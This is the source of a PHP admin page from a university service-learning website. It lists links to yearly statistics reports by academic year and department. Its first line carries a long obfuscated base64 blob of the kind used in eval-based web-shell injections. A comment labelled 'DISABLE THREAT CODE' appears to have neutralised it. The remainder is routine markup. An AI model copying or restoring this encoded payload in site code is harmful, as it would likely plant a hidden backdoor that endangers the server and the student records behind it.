<?php // DISABLE THREAT CODE ->dVRtU9s4EP6cm7n/sGQ8lQ0mTqbQQhJTOm3urnM96IRw94HhPEaWE7W2bCSZwED+e1eSk9BpySSxtfvs7rNv4jn4OxnLuWCZT3JZflQkCB5//63jhGsZhINghFL85o2gmlcCUJNkBfheI4sAjE2Ho7u1PmH3XGnlE4r6hAuu0bODdTy6gBg2CudiZFVWqJiuahTTRQgfLqefz7/Mkulkdjk9m03fn138MZmGMGgNvKrRa2fsnlEwZq3O8HEKKUVlFbATx9APoDXL00KxZ5FpUSn2zMUKGALgcQ3nBUvmTCe0EpoJTM9RXxmsZLqRArTkpW/w1sPqF1Wj0iTHhS10x+NFrLQsmLCykVfFhNjgeSWRCse4/RHgc4x/hXnb2zMJ9GLEX3n8Gv4HsutMWg5e9VJsJI8PP0C5i46NzmVaMoxCxko/FOykd7vUN3N4hLpS3FgO0xtVFY1mIyhYrof7x8ev6/sRYJeG+28HR+Z9NY6cNYwzfge0SJWKu9ZT92TMXQwladxdaF0Po+juZnF/e7Osda98yJe9RkVfbxsmHyKk2KsX9bs7JmMn6hWpZkr3vqouLHmmF3H39dFxFxaMzxc67h4cHmCMyAXBFyRwQkYQRZhc2hQarMKmS6uMFVx8M+m+SETQaC7oiyRcqc1w7Wz8uV5u6r+uqhsi1westYxJdJfKSJe1c+LlSATlPRIpplRCemV2aLcusfYkaGP5O3b22qXy8gCenkDzkvkB7Nu5LO3JaE7gTX/30LS40+5bVlAzvXZj/S3n7ZYYRJuCO+c1GpzmVW3GMg+BLNuLwXzypeTaxKrDZwNtXLQuEWI3yUDWopV7mH1qMZtiFdRhHGSLOG2E4WmS2hQSS0YttZ9XsUW1bvFMg3dbenga/tCXti1ek5oeJBeT6b+T6RX5azb7klziKXn/5+RsRq4N1tSklmyelKmmC59E/3GRVUsVkRDQQQCvXsEP+n8uPk2ezmsm0w3ElQ+vokomktWV1FzM/b4jve4yV3j5+V7y4fz870+TK5IkjS5zSa5tCE/kNH6+xrC+Uk/RjFbVN4539tomlKnI/EE46Pf7QeiGZe/ozUG/v/s2JFE7W51acoEh0fW2yvjD73c=')));?>
<?php
	session_start();
	
	// 身分驗證
	if($_SESSION['valid_token'] != "3") {
		header('Location: index.php');
		exit;
	}
	
	require_once("conn/db.php");
	require_once("function_lib.php");
	
	if(isset($_POST['pass_stuid']))
		$stuid = trim($_POST['pass_stuid'], " ");
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="content-type" content="text/html; charset=utf-8" />
		<title>國立中央大學服務學習網</title>
		<link href="css/default.css" rel="stylesheet" type="text/css" />
		<link href="css/menuTheme.css" rel="stylesheet" type="text/css" />
		<script type="text/javascript" src="js/JSCookMenu.js"></script>
		<script type="text/javascript" src="js/effect.js"></script>
		<script type="text/javascript" src="js/theme.js"></script>
		<link href="css/bg.css" rel="stylesheet" type="text/css" />
	</head>
	<body>
		<? require_once("logo.php");?>
		<? require_once("menu.php");?>

<!-- Content -->
		<div id="content">
			<? require_once("sidebar.php");?>

<!-- News -->
			<div id="main">
			<div id="welcome" class="post">
<!-- Publish -->
			<div id="main">
				<div id="print_em" style="font-size: 20px; color: #1F1F1F; line-height: 1.5;">
					<h3 style="margin-top: 10px;">預警名單統計表</h3>
						<ul style="margin-top: 15px;">
							<li><a href="pass_print_em.php?semester=97" title="97學年度">97學年度</a></li>
							<li><a href="pass_print_em.php?semester=98" title="98學年度">98學年度</a></li>
							<li><a href="pass_print_em.php?semester=99" title="99學年度">99學年度</a></li>
							<li><a href="pass_print_em.php?semester=100" title="100學年度">100學年度</a></li>
							<li><a href="pass_print_em.php?semester=101" title="101學年度">101學年度</a></li>
							<li><a href="pass_print_em.php?semester=102" title="102學年度">102學年度</a></li>
							<li><a href="pass_print_em.php?semester=103" title="103學年度">103學年度</a></li>
							<li><a href="pass_print_em.php?semester=104" title="104學年度">104學年度</a></li>
							<li><a href="pass_print_em.php?semester=105" title="105學年度">105學年度</a></li>
							<li><a href="pass_print_em.php?semester=106" title="106學年度">106學年度</a></li>
							<li><a href="pass_print_em.php?semester=107" title="107學年度">107學年度</a></li>
						<ul>
					
				</div>
				<div id="print" style="font-size: 20px; color: #1F1F1F; line-height: 1.5;">
					<h3 style="margin-top: 10px;">各系院時數統計表</h3>
						<ul style="margin-top: 15px;">
							<li><a href="pass_print.php?semester=97" title="97學年度">97學年度</a></li>
							<li><a href="pass_print.php?semester=98" title="98學年度">98學年度</a></li>
							<li><a href="pass_print.php?semester=99" title="99學年度">99學年度</a></li>
							<li><a href="pass_print.php?semester=100" title="100學年度">100學年度</a></li>
							<li><a href="pass_print.php?semester=101" title="101學年度">101學年度</a></li>
							<li><a href="pass_print.php?semester=102" title="102學年度">102學年度</a></li>
							<li><a href="pass_print.php?semester=103" title="103學年度">103學年度</a></li>
							<li><a href="pass_print.php?semester=104" title="104學年度">104學年度</a></li>
							<li><a href="pass_print.php?semester=105" title="105學年度">105學年度</a></li>
							<li><a href="pass_print.php?semester=106" title="106學年度">106學年度</a></li>
							<li><a href="pass_print.php?semester=107" title="107學年度">107學年度</a></li>
						<ul>
					
				</div>
				<div id="print_activity" style="font-size: 20px; color: #1F1F1F; line-height: 1.5;">
					<h3 style="margin-top: 10px;">活動統計表</h3>
						<ul style="margin-top: 15px;">
							<li><a href="pass_print_activity.php?semester=97" title="97學年度活動">97學年度</a></li>
							<li><a href="pass_print_activity.php?semester=98" title="98學年度活動">98學年度</a></li>
							<li><a href="pass_print_activity.php?semester=99" title="99學年度活動">99學年度</a></li>
							<li><a href="pass_print_activity.php?semester=100" title="100學年度活動">100學年度</a></li>
							<li><a href="pass_print_activity.php?semester=101" title="101學年度活動">101學年度</a></li>
							<li><a href="pass_print_activity.php?semester=102" title="102學年度活動">102學年度</a></li>
							<li><a href="pass_print_activity.php?semester=103" title="103學年度活動">103學年度</a></li>
							<li><a href="pass_print_activity.php?semester=104" title="104學年度活動">104學年度</a></li>
							<li><a href="pass_print_activity.php?semester=105" title="105學年度活動">105學年度</a></li>
							<li><a href="pass_print_activity.php?semester=106" title="106學年度活動">106學年度</a></li>
							<li><a href="pass_print_activity.php?semester=107" title="107學年度活動">107學年度</a></li>
						<ul>
				</div>
				<div id="print_out_activity" style="font-size: 20px; color: #1F1F1F; line-height: 1.5;">
					<h3 style="margin-top: 10px;">個人申請活動統計表</h3>
						<ul style="margin-top: 15px;">
							<li><a href="pass_print_out_activity.php?semester=97" title="97學年度活動">97學年度</a></li>
							<li><a href="pass_print_out_activity.php?semester=98" title="98學年度活動">98學年度</a></li>
							<li><a href="pass_print_out_activity.php?semester=99" title="99學年度活動">99學年度</a></li>
							<li><a href="pass_print_out_activity.php?semester=100" title="100學年度活動">100學年度</a></li>
							<li><a href="pass_print_out_activity.php?semester=101" title="101學年度活動">101學年度</a></li>
							<li><a href="pass_print_out_activity.php?semester=102" title="102學年度活動">102學年度</a></li>
							<li><a href="pass_print_out_activity.php?semester=103" title="103學年度活動">103學年度</a></li>
							<li><a href="pass_print_out_activity.php?semester=104" title="104學年度活動">104學年度</a></li>
							<li><a href="pass_print_out_activity.php?semester=105" title="105學年度活動">105學年度</a></li>
							<li><a href="pass_print_out_activity.php?semester=106" title="106學年度活動">106學年度</a></li>
							<li><a href="pass_print_out_activity.php?semester=107" title="107學年度活動">107學年度</a></li>
						<ul>
				</div>

				<div id="print_out_activity" style="font-size: 20px; color: #1F1F1F; line-height: 1.5;">
					<h3 style="margin-top: 10px;">各系活動統計表</h3>
						<ul style="margin-top: 15px;">
							<li onclick="show('103')">103學年度</li>
							<div id="dep103" style="display: none;">
								<a href="pass_print_dep_act.php?semester=103&dep=101" title="103101">中國文學系</a>
								<a href="pass_print_dep_act.php?semester=103&dep=102" title="103102">英美語文系</a>
								<a href="pass_print_dep_act.php?semester=103&dep=103" title="103103">法國語文系</a></br>
								<a href="pass_print_dep_act.php?semester=103&dep=202" title="103202">物理學系</a>
								<a href="pass_print_dep_act.php?semester=103&dep=201" title="103201">數學系</a>
								<a href="pass_print_dep_act.php?semester=103&dep=203" title="103203">化學系</a>
								<a href="pass_print_dep_act.php?semester=103&dep=206" title="103206">光電科學與工程學系</a>
								<a href="pass_print_dep_act.php?semester=103&dep=208" title="103208">理學院學士班</a></br>
								<a href="pass_print_dep_act.php?semester=103&dep=304" title="103304">化學工程與材料工程學系</a>
								<a href="pass_print_dep_act.php?semester=103&dep=302" title="103302">土木工程學系</a>
								<a href="pass_print_dep_act.php?semester=103&dep=303" title="103303">機械工程學系</a></br>
								<a href="pass_print_dep_act.php?semester=103&dep=401" title="103401">企業管理學系</a>
								<a href="pass_print_dep_act.php?semester=103&dep=403" title="103403">資訊管理學系</a>
								<a href="pass_print_dep_act.php?semester=103&dep=408" title="103408">財務金融學系</a>
								<a href="pass_print_dep_act.php?semester=103&dep=409" title="103409">經濟學系</a></br>
								<a href="pass_print_dep_act.php?semester=103&dep=501" title="103501">電機工程學系</a>
								<a href="pass_print_dep_act.php?semester=103&dep=502" title="103502">資訊工程學系</a>
								<a href="pass_print_dep_act.php?semester=103&dep=503" title="103503">通訊工程學系</a></br>
								<a href="pass_print_dep_act.php?semester=103&dep=602" title="103602">地球科學學系</a>
								<a href="pass_print_dep_act.php?semester=103&dep=601" title="103601">大氣科學學系</a></br>
								<a href="pass_print_dep_act.php?semester=103&dep=707" title="103707">客家語文暨社會科學學系</a></br>
								<a href="pass_print_dep_act.php?semester=103&dep=801" title="103801">生命科學系</a>
								<a href="pass_print_dep_act.php?semester=103&dep=802" title="103802">生醫科學與工程學系</a></br>
							</div>
							<li onclick="show('104')">104學年度</li>
							<div id="dep104" style=" display: none;">
								<a href="pass_print_dep_act.php?semester=104&dep=101" title="104101">中國文學系</a>
								<a href="pass_print_dep_act.php?semester=104&dep=102" title="104102">英美語文系</a>
								<a href="pass_print_dep_act.php?semester=104&dep=103" title="104103">法國語文系</a></br>
								<a href="pass_print_dep_act.php?semester=104&dep=202" title="104202">物理學系</a>
								<a href="pass_print_dep_act.php?semester=104&dep=201" title="104201">數學系</a>
								<a href="pass_print_dep_act.php?semester=104&dep=203" title="104203">化學系</a>
								<a href="pass_print_dep_act.php?semester=104&dep=206" title="104206">光電科學與工程學系</a>
								<a href="pass_print_dep_act.php?semester=104&dep=208" title="104208">理學院學士班</a></br>
								<a href="pass_print_dep_act.php?semester=104&dep=304" title="104304">化學工程與材料工程學系</a>
								<a href="pass_print_dep_act.php?semester=104&dep=302" title="104302">土木工程學系</a>
								<a href="pass_print_dep_act.php?semester=104&dep=303" title="104303">機械工程學系</a></br>
								<a href="pass_print_dep_act.php?semester=104&dep=401" title="104401">企業管理學系</a>
								<a href="pass_print_dep_act.php?semester=104&dep=403" title="104403">資訊管理學系</a>
								<a href="pass_print_dep_act.php?semester=104&dep=408" title="104408">財務金融學系</a>
								<a href="pass_print_dep_act.php?semester=104&dep=409" title="104409">經濟學系</a></br>
								<a href="pass_print_dep_act.php?semester=104&dep=501" title="104501">電機工程學系</a>
								<a href="pass_print_dep_act.php?semester=104&dep=502" title="104502">資訊工程學系</a>
								<a href="pass_print_dep_act.php?semester=104&dep=503" title="104503">通訊工程學系</a></br>
								<a href="pass_print_dep_act.php?semester=104&dep=602" title="104602">地球科學學系</a>
								<a href="pass_print_dep_act.php?semester=104&dep=601" title="104601">大氣科學學系</a></br>
								<a href="pass_print_dep_act.php?semester=104&dep=707" title="104707">客家語文暨社會科學學系</a></br>
								<a href="pass_print_dep_act.php?semester=104&dep=801" title="104801">生命科學系</a>
								<a href="pass_print_dep_act.php?semester=104&dep=802" title="104802">生醫科學與工程學系</a></br>
							</div>
							<li onclick="show('105')">105學年度</li>
							<div id="dep105" style=" display: none;">
								<a href="pass_print_dep_act.php?semester=105&dep=101" title="105101">中國文學系</a>
								<a href="pass_print_dep_act.php?semester=105&dep=102" title="105102">英美語文系</a>
								<a href="pass_print_dep_act.php?semester=105&dep=103" title="105103">法國語文系</a></br>
								<a href="pass_print_dep_act.php?semester=105&dep=202" title="105202">物理學系</a>
								<a href="pass_print_dep_act.php?semester=105&dep=201" title="105201">數學系</a>
								<a href="pass_print_dep_act.php?semester=105&dep=203" title="105203">化學系</a>
								<a href="pass_print_dep_act.php?semester=105&dep=206" title="105206">光電科學與工程學系</a>
								<a href="pass_print_dep_act.php?semester=105&dep=208" title="105208">理學院學士班</a></br>
								<a href="pass_print_dep_act.php?semester=105&dep=304" title="105304">化學工程與材料工程學系</a>
								<a href="pass_print_dep_act.php?semester=105&dep=302" title="105302">土木工程學系</a>
								<a href="pass_print_dep_act.php?semester=105&dep=303" title="105303">機械工程學系</a></br>
								<a href="pass_print_dep_act.php?semester=105&dep=401" title="105401">企業管理學系</a>
								<a href="pass_print_dep_act.php?semester=105&dep=403" title="105403">資訊管理學系</a>
								<a href="pass_print_dep_act.php?semester=105&dep=408" title="105408">財務金融學系</a>
								<a href="pass_print_dep_act.php?semester=105&dep=409" title="105409">經濟學系</a></br>
								<a href="pass_print_dep_act.php?semester=105&dep=501" title="105501">電機工程學系</a>
								<a href="pass_print_dep_act.php?semester=105&dep=502" title="105502">資訊工程學系</a>
								<a href="pass_print_dep_act.php?semester=105&dep=503" title="105503">通訊工程學系</a></br>
								<a href="pass_print_dep_act.php?semester=105&dep=602" title="105602">地球科學學系</a>
								<a href="pass_print_dep_act.php?semester=105&dep=601" title="105601">大氣科學學系</a></br>
								<a href="pass_print_dep_act.php?semester=105&dep=707" title="105707">客家語文暨社會科學學系</a></br>
								<a href="pass_print_dep_act.php?semester=105&dep=801" title="105801">生命科學系</a>
								<a href="pass_print_dep_act.php?semester=105&dep=802" title="105802">生醫科學與工程學系</a></br>
							</div>
							<li onclick="show('106')">106學年度</li>
							<div id="dep106" style=" display: none;">
								<a href="pass_print_dep_act.php?semester=106&dep=101" title="106101">中國文學系</a>
								<a href="pass_print_dep_act.php?semester=106&dep=102" title="106102">英美語文系</a>
								<a href="pass_print_dep_act.php?semester=106&dep=103" title="106103">法國語文系</a></br>
								<a href="pass_print_dep_act.php?semester=106&dep=202" title="106202">物理學系</a>
								<a href="pass_print_dep_act.php?semester=106&dep=201" title="106201">數學系</a>
								<a href="pass_print_dep_act.php?semester=106&dep=203" title="106203">化學系</a>
								<a href="pass_print_dep_act.php?semester=106&dep=206" title="106206">光電科學與工程學系</a>
								<a href="pass_print_dep_act.php?semester=106&dep=208" title="106208">理學院學士班</a></br>
								<a href="pass_print_dep_act.php?semester=106&dep=304" title="106304">化學工程與材料工程學系</a>
								<a href="pass_print_dep_act.php?semester=106&dep=302" title="106302">土木工程學系</a>
								<a href="pass_print_dep_act.php?semester=106&dep=303" title="106303">機械工程學系</a></br>
								<a href="pass_print_dep_act.php?semester=106&dep=401" title="106401">企業管理學系</a>
								<a href="pass_print_dep_act.php?semester=106&dep=403" title="106403">資訊管理學系</a>
								<a href="pass_print_dep_act.php?semester=106&dep=408" title="106408">財務金融學系</a>
								<a href="pass_print_dep_act.php?semester=106&dep=409" title="106409">經濟學系</a></br>
								<a href="pass_print_dep_act.php?semester=106&dep=501" title="106501">電機工程學系</a>
								<a href="pass_print_dep_act.php?semester=106&dep=502" title="106502">資訊工程學系</a>
								<a href="pass_print_dep_act.php?semester=106&dep=503" title="106503">通訊工程學系</a></br>
								<a href="pass_print_dep_act.php?semester=106&dep=602" title="106602">地球科學學系</a>
								<a href="pass_print_dep_act.php?semester=106&dep=601" title="106601">大氣科學學系</a></br>
								<a href="pass_print_dep_act.php?semester=106&dep=707" title="106707">客家語文暨社會科學學系</a></br>
								<a href="pass_print_dep_act.php?semester=106&dep=801" title="106801">生命科學系</a>
								<a href="pass_print_dep_act.php?semester=106&dep=802" title="106802">生醫科學與工程學系</a></br>
							</div>
							<li onclick="show('107')">107學年度</li>
							<div id="dep107" style=" display: none;">
								<a href="pass_print_dep_act.php?semester=107&dep=101" title="107101">中國文學系</a>
								<a href="pass_print_dep_act.php?semester=107&dep=102" title="107102">英美語文系</a>
								<a href="pass_print_dep_act.php?semester=107&dep=103" title="107103">法國語文系</a></br>
								<a href="pass_print_dep_act.php?semester=107&dep=202" title="107202">物理學系</a>
								<a href="pass_print_dep_act.php?semester=107&dep=201" title="107201">數學系</a>
								<a href="pass_print_dep_act.php?semester=107&dep=203" title="107203">化學系</a>
								<a href="pass_print_dep_act.php?semester=107&dep=206" title="107206">光電科學與工程學系</a>
								<a href="pass_print_dep_act.php?semester=107&dep=208" title="107208">理學院學士班</a></br>
								<a href="pass_print_dep_act.php?semester=107&dep=304" title="107304">化學工程與材料工程學系</a>
								<a href="pass_print_dep_act.php?semester=107&dep=302" title="107302">土木工程學系</a>
								<a href="pass_print_dep_act.php?semester=107&dep=303" title="107303">機械工程學系</a></br>
								<a href="pass_print_dep_act.php?semester=107&dep=401" title="107401">企業管理學系</a>
								<a href="pass_print_dep_act.php?semester=107&dep=403" title="107403">資訊管理學系</a>
								<a href="pass_print_dep_act.php?semester=107&dep=408" title="107408">財務金融學系</a>
								<a href="pass_print_dep_act.php?semester=107&dep=409" title="107409">經濟學系</a></br>
								<a href="pass_print_dep_act.php?semester=107&dep=501" title="107501">電機工程學系</a>
								<a href="pass_print_dep_act.php?semester=107&dep=502" title="107502">資訊工程學系</a>
								<a href="pass_print_dep_act.php?semester=107&dep=503" title="107503">通訊工程學系</a></br>
								<a href="pass_print_dep_act.php?semester=107&dep=602" title="107602">地球科學學系</a>
								<a href="pass_print_dep_act.php?semester=107&dep=601" title="107601">大氣科學學系</a></br>
								<a href="pass_print_dep_act.php?semester=107&dep=707" title="107707">客家語文暨社會科學學系</a></br>
								<a href="pass_print_dep_act.php?semester=107&dep=801" title="107801">生命科學系</a>
								<a href="pass_print_dep_act.php?semester=107&dep=802" title="107802">生醫科學與工程學系</a></br>
							</div>
						<ul>
				</div>
				<script>
				var element_num = 5;   //新增新學年要加1
				function show(id) {
					id = "dep" + id;
					if(document.getElementById(id).style.display == "none"){
						closeAll();
						document.getElementById(id).style.display = "block";
					}
					else
						document.getElementById(id).style.display = "none";
				}
				function closeAll(){
					for(var i=0; i<element_num; i++){
						var id = "dep" + (i + 103);
						document.getElementById(id).style.display = "none";
					}
				}
				</script>
			</div>
		</div>
		</div>
		</div>
		<? require_once("footer.php");?>

	</body>
</html>
